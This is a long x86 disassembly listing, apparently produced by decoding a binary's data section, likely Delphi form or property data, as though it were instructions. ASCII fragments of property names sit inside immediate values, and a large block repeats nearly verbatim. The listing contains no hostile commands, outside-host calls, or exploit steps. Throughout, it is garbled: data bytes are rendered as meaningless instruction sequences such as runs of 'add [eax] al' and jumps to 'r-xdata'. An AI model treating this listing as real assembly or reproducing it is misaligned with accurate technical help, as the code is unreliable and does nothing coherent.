add [ ebp - 0x345fffc0 ] cl
inc esp
add [ ebx ] al
inc edx
outsd
outsd
insb
popad
outsb
sub_44cc84
adc al 0xbf
inc ebx
add [ ebx + esi * 4 - 0x3f5fffbd ] bl
inc ebx
add ah bh
or eax [ ebp ]
mov eax 0xdc00450a
rol [ ebx ] 0xf8
or al 0x45
add [ eax + 0x100043ea ] cl
cmp al [ eax + eax - 0x30 ]
cmp al [ eax + eax - 0x3c ]
xor eax 0x3ab40044
inc esp
add [ ebx + edi * 8 ] al
inc esp
add [ esp + edx ] bh
inc ebp
add [ eax ] ch
pop es
inc esp
add [ eax + 0x27 ] ch
inc ebp
add [ esp + ebp + 0x45 ] bh
add [ eax - 0x3fffbad6 ] ch
pop es
inc esp
add ah ah
pop es
inc esp
add al bh
sub eax 0x2efc0045
inc ebp
add [ esi + eax ] bl
inc esp
add [ eax + edx * 2 ] bh
inc esp
add ah bh
cmp eax [ eax + eax + 0x34 ]
inc ebp
add [ eax + 0x6c00444f ] dh
cmp [ eax + eax ] al
push ecx
inc esp
add [ ebp + ecx * 2 - 0xb1bffbb ] bh
inc esp
add [ edi + esi * 8 + 0x3d740044 ] dl
inc ebp
add ah al
add [ ebp ] al
inc eax
add [ ebp ] eax
or [ edx + 0x45 ] dl
add al bl
std
inc esp
add [ eax - 0x2fffbab4 ] ah
xor [ ebp ] al
xchg esp eax
dec esi
inc ebp
add al bh
or eax [ ebp ]
push cs
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add [ edx + eax - 0x384c0000 ] al
inc esp
add [ eax - 0x17fffffe ] bl
mov [ eax + eax - 0x54 ] 0x18000002
enter 0x44 0x3c
add eax [ eax ]
add [ ebx ] al
sldt [ ebp + 0x27001400 ]
add [ edi ] dh
add [ ecx - 0x5eff7c00 ] al
add [ edx ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ ebx + 0x3fb04000 ] al
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x48
mov al 0x44
mov al 0xb0
[ edi - 0x13001201 ]
sub_44cf58
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xd0
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 8 + 0x3600044 ] ah
add [ eax ] al
fmul st3
inc esp
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ ebp + edx * 2 - 0x3ebffbb ] ah
inc esp
add [ edx + eax * 2 + 0x44 ] ch
add [ eax + 0x48 ] bh
inc esp
add ah al
inc edi
inc esp
add [ eax ] ah
mov dl 0x43
add [ eax ] dh
cmp eax 0x8ec0044
inc ebp
add [ ecx + edi - 0x4e9fffbc ] bh
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add al ah
or [ ebp ] eax
inc esp
0x52700043 0x45
add [ eax + 0x5c0044fd ] ah
inc [ eax + eax - 0x40 ]
inc ecx
inc eax
add [ eax + 0x2f ] al
inc ebp
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add ah al
inc [ eax + eax + 0x48 ]
dec eax
inc esp
add [ eax - 0x37ffbafb ] bh
insd
inc ecx
add [ eax - 0x13ffbaff ] ah
add [ ebp ] eax
sub [ ebx ] al
inc ebp
add [ eax ] dh
mov edi 0xe2000043
inc ecx
add [ eax - 0x23ffbaf4 ] bh
fiadd [ ecx ]
movsb [ edi ] [ esi ]
push ebp
inc ebp
add [ esp + edi * 8 ] dl
sub_44d11a
mov esp 0x10043b4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
add eax 0x67696c41
outsb
add [ eax ] dl
inc eax
add [ eax ] ch
add eax [ eax ]
inc [ eax ]
push edi
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or al [ ecx + 0x6c ]
jo r-xdata
add [ eax ] al
pop ss
add [ edx ] cl
inc ecx
jne r-xdata
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
sub [ ebx ] eax
add bh bh
adc al 0x57
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc eax 0x6c410f00
jo r-xdata
mov [ eax + eax + 0x71 ] 0xe0ff0002
sbb [ ebp ] al
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or eax [ edx + 0x6f ]
jb r-xdata
outsd
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
jmp [ eax ]
add [ eax ] al
sbb [ eax ] al
or [ ecx + 0x75 ] al
je r-xdata
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
add [ eax ] al
sbb [ esi ] 0x0
or al 0x43
jb r-xdata
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax + eax ]
outsd
mov al [ 0x6100436c ]
add [ eax ] al
push [ eax ]
mov dl 0x43
add [ ebx + esi * 4 + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
push ss
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
popad
outsb
jae r-xdata
jl r-xdata
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ edx + edi * 4 + 0xae00043 ] dh
add [ ebx + ecx ] dl
loopne r-xdata
insb
add [ edi ] dl
inc ebp
add [ eax + 0x1c ] ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
sbb al [ eax ]
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] dl
inc eax
add [ eax + 0x2 ] bl
add bh bh
inc eax
test [ eax + eax + 0x58 ] 0x8
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push ebp
jae r-xdata
popad
jb r-xdata
add eax 0x6f6c6f43
jb r-xdata
inc edx
add [ eax ] dh
add bh bh
call 0x44516be
retn
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
add [ eax ] al
add [ eax + 0x430b001f ] al
inc ebp
add [ eax ] ah
or [ ebp ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ebx ] cl
inc ebx
inc ebp
add [ eax ] ah
or [ ebp ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ebx + eax * 2 ] cl
outsd
outsb
cmp al 0x10
inc eax
add al bh
add [ ecx + eax + 0x3da4ff00 ] bl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307001d ] al
popad
jo r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
adc [ eax ] al
jb r-xdata
push eax
add eax [ eax ]
mov edx 0xb140043
imul ebp [ edi + 0x6e ] r-xdata
clc
arpl [ edi + 0x6e ] bp
jae r-xdata
inc eax
in al dx
leave
inc esp
add [ ecx + 0x2 ] bh
add bh bh
jns r-xdata
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
dec eax
rol [ ebx ] 0x78
rol [ ebx ] 0x60
sbb al 0x45
add [ eax ] al
xchg esp eax
jle r-xdata
sub [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
fadd [ ecx ]
add bh bh
adc [ edi ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ eax ] cl
inc esp
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp - 0x4 ] 0x8f00436b
add [ eax ] al
dec [ edi + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add bh bh
and eax 0x73550e00
inc esp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
add [ eax ] al
add [ es : esi ] cl
inc esp
popa
jne r-xdata
add eax [ eax ]
add [ eax ] al
and al 0x0
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add bl bl
add [ eax ] eax
[ eax ]
aas
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add cl bl
add [ eax ] eax
inc esp
cmp eax 0x3de80044
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
push 0xa8fe0000
out 0x43 eax
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ ecx ] bl
add bh bh
je r-xdata
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0023 ] al
outsd
outsb
jae r-xdata
dec eax
insd
inc ebx
add [ eax + eax ] dh
inc [ eax - 0x14 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
jmp [ eax + eax ]
imul eax [ ebx ] 0x5d
outsd
outsb
imul esp [ gs : edi + 0x68 ] 0x4010b074
outsb
je r-xdata
dec ecx
imul ebp [ ebp - 0x4c ] 0x500044c2
add al [ eax ]
cmp al 0x10
outsd
outsb
je r-xdata
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor [ eax ] al
or cl [ ebx + 0x65 ]
jns r-xdata
add bh bh
add [ eax ] al
sub eax 0x6f460900
jb r-xdata
sbb eax 0x680042
add bh bh
cmp al 0xc2
inc ebx
add [ edx + eax * 8 + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604002c ] al
outsd
outsb
je r-xdata
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0033 ] al
jb r-xdata
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
add [ edx + eax + 0x284ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : eax ] cl
dec eax
insb
jo r-xdata
mov al 0x10
inc eax
enter 0x44 0x77
add al [ eax ]
call [ eax + 0x6000451c ]
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0036 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
popad
je r-xdata
popad
jbe r-xdata
imul esp [ edi + 0x68 ] 0x4010b074
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ ebp + 0x2 ] dh
add bh bh
jne r-xdata
daa
inc edx
add [ eax + 0x54ff0002 ] cl
sbb al 0x45
add [ eax + 0x1c ] ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002f ] al
inc eax
add [ eax + eax ] cl
jmp [ eax + edi * 4 + 0x43 ]
insb
cmp al 0x10
hlt
outsb
arpl [ eax - 0x70 ] bp
add eax 0x800043
add bh bh
cld
rol [ ebx ] 0x60
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
jb r-xdata
jb r-xdata
ja r-xdata
add [ ebp + 0x2 ] bh
add bh bh
jge r-xdata
jo r-xdata
inc esp
add [ ebx + eax ] dh
add bh bh
clc
and [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or edx [ eax + 0x6f ]
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : 0x65786950 ] cl
jb r-xdata
outsb
std
inc edx
add [ eax - 0x7f00fffe ] ch
push ds
inc ebp
add [ eax + 0x1c ] ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0034 ] al
bound ebp [ edx + 0x65 ]
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
add [ 0x7a726f48 ] cl
push ebx
arpl [ edx + 0x6f ] si
insb
jne r-xdata
outsd
inc ebx
add [ eax - 0x5700ffff ] ah
push eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50070031 ] al
popad
imul ebp [ fs : esi + 0x67 ] r-xdata
nop
add al [ eax ]
dec esp
push ds
inc ebp
add [ eax + 0x1c ] ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d040032 ] al
outsb
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
cmp eax [ eax ]
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
add bh bh
cld
outsb
jne r-xdata
cmp eax 0x63530a00
jb r-xdata
add eax [ eax ]
dec [ eax + 0x3 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
adc [ eax ] al
jl r-xdata
js r-xdata
je r-xdata
adc [ eax ] 0x0
or eax 0x74726556
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
outsb
je r-xdata
add [ eax + 0x1 ] al
xor eax 0x61500e00
jb r-xdata

add [ eax + 0x22 ] bl
inc ebp
add [ edx + 0x45 ] ah
add [ eax + 0x1c ] ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
cmp al 0x0
push es
popad
jb r-xdata
jl r-xdata
add bh bh
jo r-xdata
add [ eax ] al
add [ eax + 0x500b0039 ] al
outsd
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090037 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
jo r-xdata
adc [ eax ] al
push edi
add [ eax ] al
dec [ eax + 0xb ]
inc ebp
add [ eax ] cl
call sub_44d84a
add [ eax ] al
inc eax
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
dec eax
add [ eax ] al
push [ eax ]
mov eax 0x8300043
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050005 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jae r-xdata
adc [ eax ] al
lea eax [ eax ]
add bh bh
cwde
retn 0x43
push ebx
outsb
popad
jo r-xdata
outsd
outsb
in al dx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax ] al
or [ eax + 0x6f ] edx
jo r-xdata
outsb
je r-xdata
push ebx
arpl [ ecx + 0x6c ] sp
add [ fs : eax ] dl
inc eax
add [ eax + 0x3 ] cl
add bh bh
dec eax
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
insb
inc ebx
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
push cs
dec edi
add bh bh
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
push esp
and eax [ ebp ]
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add bh bh
inc eax
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
adc [ eax ] al
[ ebp ] al
push esp
and [ ebp ] eax
add [ eax ] al
je r-xdata
outsb
enter 0x44 0x78
add al [ eax ]
dec [ eax + 0x60004521 ]
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
cmp al [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
leave
inc esp
outsd
sub_44d343
push edi
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
adc eax 0x6e617254
jae r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
inc eax
in al dx
leave
inc esp
add [ ecx + 0x2 ] bh
add bh bh
jns r-xdata
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
sub [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
fadd [ ecx ]
add bh bh
adc [ edi ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ eax ] cl
inc esp
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp - 0x4 ] 0x8f00436b
add [ eax ] al
dec [ edi + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add bh bh
and eax 0x73550e00
inc esp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
add [ eax ] al
add [ es : esi ] cl
inc esp
popa
jne r-xdata
add eax [ eax ]
add [ eax ] al
and al 0x0
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add bl bl
add [ eax ] eax
[ eax ]
aas
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add cl bl
add [ eax ] eax
inc esp
cmp eax 0x3de80044
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
push 0xa8fe0000
out 0x43 eax
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ ecx ] bl
add bh bh
je r-xdata
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0023 ] al
outsd
outsb
jae r-xdata
dec eax
insd
inc ebx
add [ eax + eax ] dh
inc [ eax - 0x14 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
jmp [ eax + eax ]
imul eax [ ebx ] 0x5d
outsd
outsb
imul esp [ gs : edi + 0x68 ] 0x4010b074
outsb
je r-xdata
dec ecx
imul ebp [ ebp - 0x4c ] 0x500044c2
add al [ eax ]
cmp al 0x10
outsd
outsb
je r-xdata
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor [ eax ] al
or cl [ ebx + 0x65 ]
jns r-xdata
add bh bh
add [ eax ] al
sub eax 0x6f460900
jb r-xdata
sbb eax 0x680042
add bh bh
cmp al 0xc2
inc ebx
add [ edx + eax * 8 + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604002c ] al
outsd
outsb
je r-xdata
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0033 ] al
jb r-xdata
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
add [ edx + eax + 0x284ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : eax ] cl
dec eax
insb
jo r-xdata
mov al 0x10
inc eax
enter 0x44 0x77
add al [ eax ]
call [ eax + 0x6000451c ]
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0036 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
popad
je r-xdata
popad
jbe r-xdata
imul esp [ edi + 0x68 ] 0x4010b074
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ ebp + 0x2 ] dh
add bh bh
jne r-xdata
daa
inc edx
add [ eax + 0x54ff0002 ] cl
sbb al 0x45
add [ eax + 0x1c ] ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002f ] al
inc eax
add [ eax + eax ] cl
jmp [ eax + edi * 4 + 0x43 ]
insb
cmp al 0x10
hlt
outsb
arpl [ eax - 0x70 ] bp
add eax 0x800043
add bh bh
cld
rol [ ebx ] 0x60
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
jb r-xdata
jb r-xdata
ja r-xdata
add [ ebp + 0x2 ] bh
add bh bh
jge r-xdata
jo r-xdata
inc esp
add [ ebx + eax ] dh
add bh bh
clc
and [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or edx [ eax + 0x6f ]
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : 0x65786950 ] cl
jb r-xdata
outsb
std
inc edx
add [ eax - 0x7f00fffe ] ch
push ds
inc ebp
add [ eax + 0x1c ] ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0034 ] al
bound ebp [ edx + 0x65 ]
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
add [ 0x7a726f48 ] cl
push ebx
arpl [ edx + 0x6f ] si
insb
jne r-xdata
outsd
inc ebx
add [ eax - 0x5700ffff ] ah
push eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50070031 ] al
popad
imul ebp [ fs : esi + 0x67 ] r-xdata
nop
add al [ eax ]
dec esp
push ds
inc ebp
add [ eax + 0x1c ] ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d040032 ] al
outsb
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
cmp eax [ eax ]
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
add bh bh
cld
outsb
jne r-xdata
cmp eax 0x63530a00
jb r-xdata
add eax [ eax ]
dec [ eax + 0x3 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
adc [ eax ] al
jl r-xdata
js r-xdata
je r-xdata
adc [ eax ] 0x0
or eax 0x74726556
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
outsb
je r-xdata
add [ eax + 0x1 ] al
xor eax 0x61500e00
jb r-xdata

add [ eax + 0x22 ] bl
inc ebp
add [ edx + 0x45 ] ah
add [ eax + 0x1c ] ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
cmp al 0x0
push es
popad
jb r-xdata
jl r-xdata
add bh bh
jo r-xdata
add [ eax ] al
add [ eax + 0x500b0039 ] al
outsd
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090037 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
jo r-xdata
adc [ eax ] al
push edi
add [ eax ] al
dec [ eax + 0xb ]
inc ebp
add [ eax ] cl
call sub_44d84a
add [ eax ] al
inc eax
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
dec eax
add [ eax ] al
push [ eax ]
mov eax 0x8300043
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050005 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jae r-xdata
adc [ eax ] al
lea eax [ eax ]
add bh bh
cwde
retn 0x43
push ebx
outsb
popad
jo r-xdata
outsd
outsb
in al dx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax ] al
or [ eax + 0x6f ] edx
jo r-xdata
outsb
je r-xdata
push ebx
arpl [ ecx + 0x6c ] sp
add [ fs : eax ] dl
inc eax
add [ eax + 0x3 ] cl
add bh bh
dec eax
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
insb
inc ebx
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
push cs
dec edi
add bh bh
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
push esp
and eax [ ebp ]
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add bh bh
inc eax
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
adc [ eax ] al
[ ebp ] al
push esp
and [ ebp ] eax
add [ eax ] al
je r-xdata
outsb
enter 0x44 0x78
add al [ eax ]
dec [ eax + 0x60004521 ]
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
cmp al [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
leave
inc esp
outsd
sub_44d6bb
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ eax ] al
or [ eax + 0x6f ] edx
jo r-xdata
inc eax
add [ eax + 0x22 ] bl
inc ebp
add [ edx + 0x45 ] ah
add [ eax + 0x1c ] ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
cmp al 0x0
push es
push ebx
arpl [ ecx + 0x6c ] sp
add [ fs : eax ] dl
inc eax
add [ eax + 0x3 ] cl
add bh bh
dec eax
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp eax 0x63530a00
jb r-xdata
jo r-xdata
adc [ eax ] 0x0
or eax 0x74726556
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
outsb
push ebx
outsb
popad
jo r-xdata
leave
inc esp
add [ ebp + 0x2 ] bh
add bh bh
jge r-xdata
outsd
hlt
adc [ eax ] al
push edi
add [ eax ] al
dec [ eax + 0xb ]
inc ebp
add [ eax ] cl
call sub_44d84a
add [ eax ] al
inc eax
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
dec eax
add [ eax ] al
push [ eax ]
mov eax 0x8300043
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050005 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jae r-xdata
adc [ eax ] al
lea eax [ eax ]
add bh bh
cwde
retn 0x43
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
cmp eax [ eax ]
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
add bh bh
push esp
and eax [ ebp ]
pushad
sbb al 0x45
add [ eax ] al
add [ eax ] al
add bh bh
sub_44d84a
add [ eax ] 0x0
add [ eax ] al
inc ecx
add [ ebx ] cl
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
dec edi
outsb
inc ecx
insb
imul esp [ edi + 0x6e ] 0x65736e49
jb r-xdata
aam 0xfd
inc edx
add [ eax - 0x5b00fffe ] ah
push ds
inc ebp
add [ eax + 0x1c ] ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a0042 ] al
